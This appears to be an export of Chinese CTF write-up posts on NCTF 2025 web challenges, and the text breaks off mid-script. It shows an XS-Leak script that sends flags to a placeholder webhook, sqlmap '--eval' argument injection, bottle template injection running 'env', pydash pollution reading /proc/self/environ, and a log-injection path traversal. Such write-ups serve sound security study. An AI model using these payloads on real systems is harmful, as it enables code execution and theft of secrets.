[{"content":" misc ","date":"2025-03-30T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss%23round29-misc/","title":"2025-nss#round29-misc"},{"content":"web internal_api 打XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // 定义函数，参数应为尝试的新flag（但被错误覆盖） url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // 🚨错误：覆盖传入的url参数，实际使用的flag始终是全局变量初始值 let script = document.createElement(\u0026#39;script\u0026#39;) // 创建\u0026lt;script\u0026gt;标签用于发起请求 let ret = false // 🚨未使用的变量 script.src = url // 设置脚本地址（实际为固定地址，无法测试新字符） script.onload = () =\u0026gt; { // 脚本加载成功时触发 fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // 发送当前全局flag到攻击者服务器（但全局flag从未更新） } script.onerror = (e) =\u0026gt; {} // 加载失败不处理（未利用错误信息） document.head.appendChild(script) // 插入脚本以触发请求 } // 定义字符集和已知flag前缀 let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // 猜测字符范围（包含闭合符}） let flag = \u0026#39;flag{\u0026#39; // Flag的通用开头（CTF常见格式） // 主爆破循环 for (let i = 0; i \u0026lt; charset.length; i++) { // 遍历字符集 let c = charset[i] // 获取当前尝试的字符 let newFlag = flag + c // 组合新flag（如flag{a） checkError(newFlag) // 🚨错误：传入参数未被函数使用，实际所有请求仍为flag{ } \u0026lt;/script\u0026gt; 每次运行爆出一位，然后手动在let flag = \u0026lsquo;flag{\u0026lsquo;后加上即可\n文章 - 浅谈XS-Leaks之Timeless timing attck - 先知社区\nsqlmap-master 先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # 导入FastAPI框架及请求对象 from fastapi.responses import FileResponse, StreamingResponse # 导入文件响应和流式响应类 import subprocess # 用于执行系统命令 app = FastAPI() # 创建FastAPI应用实例 @app.get(\u0026#34;/\u0026#34;) # 定义根路径的GET路由 async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # 返回静态文件index.html（前端页面） @app.post(\u0026#34;/run\u0026#34;) # 定义/run路径的POST路由 async def run(request: Request): # 接收请求对象 data = await request.json() # 异步获取请求的JSON数据 url = data.get(\u0026#34;url\u0026#34;) # 从数据中提取url参数 if not url: # 校验url参数是否存在 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # 返回错误信息 # 构建sqlmap命令（存在安全风险！见下方警告） command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; # 直接拼接参数可能导致命令注入漏洞 def generate(): # 定义生成器函数用于流式输出 # 启动子进程执行命令 process = subprocess.Popen( command.split(), # 将命令按空格分割成列表（简单方式，复杂参数可能出错） stdout=subprocess.PIPE, # 捕获标准输出 stderr=subprocess.STDOUT, # 将错误输出合并到标准输出 shell=False # 禁用shell模式（安全最佳实践） ) while True: # 持续读取输出 output = process.stdout.readline() # 逐行读取输出 if output == \u0026#39;\u0026#39; and process.poll() is not None: # 判断进程是否结束 break if output: # 如果有输出内容 yield output # 生成输出内容 # 返回流式响应（实时显示扫描结果） return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 这里shell=flase,意味内容不会经过 Shell 的语法解析，全被当作参数看待，那就直接找找sqlmap有哪些可以执行命令或者读文件的参数\nsqlmap | GTFOBins\n通过 \u0026ndash;eval 参数可以执⾏ Python 代码, 注意因为上⾯ command.split() 默认是按空格分隔的（所以下面的=号可变空格），注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell=False , 如果加上去反⽽代表的是 \u0026ldquo;eval ⼀个 Python 字符串\u0026rdquo;，然后将payload改为紧凑型，避免使用分号。\n最终payload\n最后打127.0.0.1 --eval=__import__('os').system('env')//等号可以变空格\n用法 | sqlmap 用户手册\n翻了翻sqlmap手册，发现-c可以加载配置文件选项、\n所以也可以打\nhttps://localhost?id=1 -c /proc/self/environ //id=1没实际作用，测试时候写的，可以不加\nez_dash 审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 # 提示信息：Flag在环境变量中，这可能意味着代码中存在某种漏洞，可以通过漏洞获取环境变量中的Flag值。 from typing import Optional # 导入Optional类型，用于类型注解 import pydash # 导入pydash模块，用于操作对象属性 import bottle # 导入bottle框架，用于创建Web服务器 # 定义一个包含禁止访问的属性路径的列表，这些路径通常是Python对象的内部属性，防止用户通过这些路径篡改对象内部结构。 __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;func\u0026#34;, \u0026#34;render\u0026#34;] # 定义一个包含禁止访问的名称的列表，初始时包含\u0026#34;bottle\u0026#34;，防止用户直接操作bottle模块。 __forbidden_name__=[\u0026#34;bottle\u0026#34;] # 将内置模块中的所有属性名称添加到禁止访问的名称列表中，防止用户通过内置模块进行危险操作。 __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 定义一个函数setval，用于设置指定对象的属性值。 def setval(name:str, path:str, value:str) -\u0026gt; Optional[bool]: # 如果名称中包含双下划线（__），直接返回False，防止用户访问Python的特殊方法或属性。 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False # 遍历禁止访问的名称列表，如果名称在列表中，返回False。 for word in __forbidden_name__: if name==word: return False # 遍历禁止访问的路径列表，如果路径中包含列表中的内容，返回False。 for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False # 从全局变量中获取指定名称的对象。 obj=globals()[name] try: # 使用pydash模块的set_方法设置对象的属性值。 pydash.set_(obj, path, value) except: # 如果设置失败，返回False。 return False # 如果设置成功，返回True。 return True # 定义一个bottle的POST路由/setValue，用于接收用户请求并调用setval函数设置属性值。 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 从请求的查询参数中获取对象名称。 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 从请求的JSON数据中获取属性路径。 path = bottle.request.json.get(\u0026#39;path\u0026#39;) # 如果路径不是字符串，返回\u0026#34;no\u0026#34;。 if not isinstance(path, str): return \u0026#34;no\u0026#34; # 如果名称或路径长度超过限制，返回\u0026#34;no\u0026#34;。 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 从请求的JSON数据中获取属性值。 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置属性值，根据返回值返回\u0026#34;yes\u0026#34;或\u0026#34;no\u0026#34;。 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 定义一个bottle的GET路由/render，用于渲染模板。 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 从请求的查询参数中获取模板路径。 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 如果路径中包含\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;等字符，返回\u0026#34;Hacker\u0026#34;，防止用户通过模板注入攻击。 if path.find(\u0026#34;{\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;}\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;.\u0026#34;) \u0026gt;= 0: return \u0026#34;Hacker\u0026#34; # 使用bottle的template方法渲染模板并返回结果。 return bottle.template(path) # 启动bottle服务器，监听0.0.0.0的8000端口。 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 解法一 这里没过滤%，所以在rende路由可以执行python代码（类似打ssti）,paylaod\n原型是%eval(\u0026quot;__import__('os').popen('env')\u0026quot;)但是过滤了点号，所以用chr(46)代替，然后也不能出现空格，然后render只能渲染文件，不能渲染字符串，所以要将env输入到一个文件中，所以最终pyload是\n%eval(\u0026quot;__import__('os')\u0026quot;%2bchr(46)%2b\u0026quot;popen('env\u0026gt;1')\u0026quot;)\n解法二：打abort无回显 1 \u0026lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\u0026#34;env\u0026#34;)%0aabort(404,a)%20%\u0026gt; 写成代码形式可能看得懂一点\n1 2 3 4 5 6 7 8 9 10 11 # 从bottle库中导入abort函数，用于发送HTTP错误响应 from bottle import abort # 从subprocess库中导入getoutput函数，用于执行系统命令并获取输出 from subprocess import getoutput # 执行系统命令\u0026#34;env\u0026#34;，该命令用于列出当前环境变量，并将输出存储在变量a中 a = getoutput(\u0026#34;env\u0026#34;) # 使用abort函数发送一个404 HTTP错误响应，并将环境变量的输出作为错误消息返回 abort(404, a) ez_dash_revenge 此题过滤了%，所以无法打上面得非预期（其实上面也是考原型污染链）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from typing import Optional import pydash import bottle # 禁止访问的路径属性列表，主要是Python对象的特殊方法和属性 __forbidden_path__ = [\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;render\u0026#34; ] # 禁止访问的名称列表，包括bottle模块和内置对象 __forbidden_name__ = [\u0026#34;bottle\u0026#34;] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 设置变量值的函数 def setval(name: str, path: str, value: str) -\u0026gt; Optional[bool]: # 如果名称包含双下划线，返回False if name.find(\u0026#34;__\u0026#34;) \u0026gt;= 0: return False # 检查名称是否在禁止列表中 for word in __forbidden_name__: if name == word: return False # 检查路径是否包含禁止的属性 for word in __forbidden_path__: if path.find(word) \u0026gt;= 0: return False # 获取全局对象 obj = globals()[name] try: # 使用pydash.set_方法设置对象的属性值 pydash.set_(obj, path, value) except: # 如果设置失败，返回False return False # 设置成功，返回True return True # 处理POST请求的路由，用于设置变量值 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 获取请求中的name参数 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 获取请求中的path参数，必须是字符串类型 path = bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path, str): return \u0026#34;no\u0026#34; # 检查name和path的长度是否超出限制 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 获取请求中的value参数 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置变量值，并根据结果返回yes或no return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 处理GET请求的路由，用于渲染模板 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 获取请求中的path参数 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 检查path长度是否超出限制 if len(path) \u0026gt; 10: return \u0026#34;hacker\u0026#34; # 定义黑名单字符，防止路径注入 blacklist = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;_\u0026#34;] # 检查path是否包含黑名单字符 for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; # 使用bottle.template渲染模板 return bottle.template(path) # 启动bottle应用，监听所有接口的8000端口 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 此题先看懂setval函数，这里面 pydash.set_(obj, path, value)很重要，其中name是我们要污染的对象，path是被污染的功能点路径，value是我们想让这个对象成为的值。\n再来看此题，由pydash知https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.py，path有一个bottle.TEMPLATE_PATH\u0026mdash;(指定模板文件所在的路径)，我们要污染他的路径，让他指向/proc/self/,然后再最后在 /render 路由下 GET 传参 path 为 environ ，对其进⾏渲染，就可以获取环境变量了，但是pydash限制不能随意更改bottle属性，接下来审计一下pydash源码，关键限制代码如下（截取了三段代码）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 def base_set(obj, key, value, allow_override=True): \u0026#34;\u0026#34;\u0026#34; Set an object\u0026#39;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available index position, append to list; otherwise, pad the list of ``None`` and then append to the list. Args: obj: Object to assign value to. key: Key or index to assign to. value: Value to assign. allow_override: Whether to allow overriding a previously set key. \u0026#34;\u0026#34;\u0026#34; # 如果obj是字典类型 if isinstance(obj, dict): # 如果允许覆盖或者key不在字典中 if allow_override or key not in obj: # 将key对应的值设置为value obj[key] = value # 如果obj是列表类型 elif isinstance(obj, list): # 将key转换为整数类型 key = int(key) # 如果key小于列表的长度 if key \u0026lt; len(obj): # 如果允许覆盖 if allow_override: # 将列表中key位置的值设置为value obj[key] = value else: # 如果key大于列表的长度 if key \u0026gt; len(obj): # 使用None填充列表，直到key的位置 obj[:] = (obj + [None] * key)[:key] # 在列表末尾追加value obj.append(value) # 如果obj是其他类型，并且允许覆盖或者该属性不存在，并且obj不是None elif (allow_override or not hasattr(obj, key)) and obj is not None: # 调用_raise_if_restricted_key函数检查是否是受限制的键 _raise_if_restricted_key(key) # 使用setattr函数设置obj的key属性为value setattr(obj, key, value) 1 RESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 1 2 3 4 def _raise_if_restricted_key(key): # Prevent access to restricted keys for security reasons. if key in RESTRICTED_KEYS: raise KeyError(f\u0026#34;access to restricted key {key!r} is not allowed\u0026#34;) 所以接下来思路明显了，先污染key函数为空，使我们可以用globals，然后再污染PATH，再渲染envrion即可\n用bp在/setValue抓包\n1 2 3 name=pydash#污染对象是pydash path:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34; # 路径就是 helpers ⽂件中的 RESTRICTED_KEYS value:[]#修改成为的值就是空列表 1 2 3 name=setval # 污染对象是 setval path:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34; # 路径是模板⽂件路径 value:[../../../../proc/self] # 修改为的值是存储环境变量⽂件路径，因为题⽬提示flag在环境变量中name=setval 深度解析：此paylaod寻找setval函数，将该函数往上查询____globals____.（__globals__ 是函数对象的一个属性，它会返回一个包含该函数全局命名空间的字典）,然后调用bottle框架中的TEMPLATE_PATH(指定模板文件所在的路径)，将路径设置为/proc/self/这样访问path时会自动跳转到这个路径下\n流程：\n1 2 3 4 5 { \u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;, \u0026#34;value\u0026#34;:[ ] } 注意type改成json\n1 2 3 4 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[\u0026#34;/proc/self\u0026#34;] } ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nctf-web/","title":"2025-nctf-web"},{"content":" ccforum Seay审计一下代码\nadmin.php与config.php存在file_get_content函数，即存在文件读取漏洞，那么先审计admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // 引入配置文件，通常包含数据库连接信息等 require \u0026#39;config.php\u0026#39;; // 检查请求方法是否为POST，如果是，则处理登录逻辑 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // 获取POST请求中的用户名和密码，默认值为空字符串 $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // 准备SQL语句，查询admins表中用户名匹配的记录 $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // 执行查询，传入用户名作为参数 $stmt-\u0026gt;execute([$username]); // 获取查询结果 $admin = $stmt-\u0026gt;fetch(); // 如果查询到管理员且密码验证通过 if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // 设置会话变量，标识管理员登录状态 $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // 记录登录成功的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 1); // 重定向到管理员页面 header(\u0026#34;Location: admin.php\u0026#34;); // 终止脚本执行 exit(); } else { // 记录登录失败的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // 输出错误信息并终止脚本 die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // 捕获数据库操作异常，记录错误日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // 输出错误信息并终止脚本 die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // 检查会话中是否没有管理员登录状态，如果是，则拒绝访问 if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // 定义操作日志文件路径 $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // 检查操作日志文件是否存在，如果不存在，则输出错误信息并终止脚本 if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // 读取操作日志文件内容 $action_log = file_get_contents($action_log_path); // 将日志内容按行分割成数组 $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // 初始化被封禁用户和失败日志数组 $banned_users = []; $failed_logs = []; // 遍历每一行日志 foreach ($log_lines as $line) { // 如果行为空，跳过 if (empty($line)) { continue; } // 按逗号分割日志行 $parts = explode(\u0026#39;,\u0026#39;, $line); // 如果分割后的部分数量不足5个，跳过 if (count($parts) \u0026lt; 5) { continue; } // 获取编码后的用户名、操作类型、成功状态和附加信息 $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; //总结上面的代码就是获取/var/www/action.log给action_log，再用，分割成part // 如果操作类型是记录封禁 if ($action === \u0026#39;record_banned\u0026#39;) { // 如果操作成功 if ($success === 1) { // 将附加信息添加到被封禁用户数组中 $banned_users[$encoded_user][] = $additional_info; } else { // 将附加信息添加到失败日志数组中 $failed_logs[] = $additional_info; } } } //这里要求action==record_banned,success=1,然后进行下面的遍历文件目录的内容全部传给参数， 所以如果构造{$encoded_user}为../../../,就相当与回到根目录，从而可能读到flag // 初始化被封禁内容数组 $banned_contents = []; // 遍历被封禁用户数组 foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//构造{$encoded_user}为../../../，之后直接读根目录 // 如果目录存在 if (file_exists($banned_dir)) { // 获取目录中的文件列表 $files = scandir($banned_dir); // 遍历文件列表 foreach ($files as $file) { // 跳过目录本身和父目录 if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // 构造文件路径 $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // 读取文件内容 $content = file_get_contents($file_path); // 将内容添加到被封禁内容数组中 $banned_contents[$username][] = $content; } } } } ?\u0026gt; 接下来要知道action.log的内容，所以先看看config.php文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // 启动会话 session_start(); // 定义数据库连接参数 define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // 创建PDO实例，连接到MySQL数据库 $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // 设置错误模式为异常 ); } catch (PDOException $e) { // 如果连接失败，输出错误信息并终止脚本 die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // 定义一个函数，用于对用户名进行Base64编码 function encode_uname($username) { return base64_encode($username); } // 定义一个函数，用于记录操作日志 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // 定义一个函数，用于记录封禁操作 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // 定义一个函数，用于检查内容是否包含敏感词 function has_sensitive_words($content) { // 定义敏感词列表 $SENSITIVE_WORDS = [\u0026#39;敏感词\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // 遍历敏感词列表 foreach ($SENSITIVE_WORDS as $word) { // 使用stripos函数（不区分大小写）检查内容中是否包含敏感词 if (stripos($content, $word) !== false) { // 如果找到敏感词，返回true return true; } } // 如果没有找到敏感词，返回false return false; } 首先看log_action函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } 看这个代码知道，log_id是唯一生成的，不可控制，e_username被加密，不好控制进行目录穿越，action要=record_banned,success=1，所以只能控制additional(它刚好为空)\n接下来寻找调用action_log的地方，也就是record_banned函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } 这里若是想传入/var/www/action.log后想要变量根目录所有文件，必须有某一行满足?(path[0]是id不用管)，../../../,record_banned,1,(path[4]无要求)，第一行是绝对不可能，因为username被base64加密，所以第一行就构造不了../../../（因为没有什么加密后是../../../）,所以就在第二行构造?,../../../,record_banned,1,?。那么就要在log下手了\n这里$log有3种情况，空或Failed to create record directory for \u0026quot; . $username;或\u0026quot;Failed to record banned content\u0026quot;；显然我们要通过构造username这个变量达到目的。所以log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;要到达这个目的，就要使创建目录失败，mkdir方法不可以创建多级目录，即其中不能包含/字符，也就是说username编码后包含/,恰好???编码后有/\n第二行怎么出来？显然要%0a,那还要满足第二行包括?,../../../,record_banned,? 那很显然了，username=???%0a,../../../,record_banned,1,\n所以写入/var/www/action.log的内容是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, 经过分行后第一行是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\n第二行是,../../../,record_banned,1, 符合要求！\n接下来找调用record_banned的函数，在post.php里\nhas_sensitive_words在config.php里\n显然要符合has_sensitive_words($title) || has_sensitive_words($content)，即让title或content存在敏感词或者 SENSITIVE WORDS\n所以解题思路、\n1.先注册用户username=???\\n,../../../,record_banned,1, password=111111111(任意内容，满足长度就好,手动注册的话\\n要写成%0a)\n2.访问post路由，post传参title或者content\n3.登入管理员账户，进入admin.php,拿到flag（爆破）\n直接打脚本也行，然后直接访问admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = 